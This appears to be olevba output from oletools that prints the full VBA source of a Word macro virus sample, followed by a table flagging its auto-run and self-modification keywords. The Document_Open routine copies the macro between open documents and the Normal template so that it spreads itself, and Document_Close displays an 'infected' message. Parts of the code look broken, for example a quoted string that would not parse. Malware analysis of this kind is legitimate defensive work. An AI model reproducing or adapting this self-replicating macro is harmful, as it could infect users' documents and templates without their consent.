olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-e2329bb479fac4f598374d8b669db1dddffe6bbd
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-e2329bb479fac4f598374d8b669db1dddffe6bbd 
in file: Virus.MSOffice.Source-e2329bb479fac4f598374d8b669db1dddffe6bbd - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open ()
Dim Norm, NormCode, NormLines, Doc, DocCode, DocLines
Set Norm = NormalTemplate.VBProject.VBComponents(1)
Set Doc = ActiveDocument.VBProject.VBComponents(1)
Set DocCode = Doc.CodeModule:Set NormCode = Norm.CodeModule
If DocCode.lines(23, 1) = "" Then
    For y = 1 To DocCode.countoflines
DocCode.replacelines y, "$MOOTHiE's Macro Virus Creator 2000 Ver. 1.0"
    Next y
    For x = 2 To NormCode.countoflines
DocCode.insertlines 26 + x, NormCode.lines(x, 1)
   Next x
End If
If NormCode.lines(23, 1) = "" Then
    For y = 1 To NormCode.countoflines
NormCode.replacelines y, "$MOOTHiE's Macro Virus Creator 2000 Ver. 1.0"
    Next y
    For x = 1 To DocCode.countoflines
NormCode.insertlines 26 + x, DocCode.lines(x, 1)
    Next x
End If
End Sub
Private Sub Document_New ()
End Sub
Private Sub Document_Close ()
MsgBox "You have been infected by the "123" virus!  Thank you, and have a nice day.", vbInformation
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

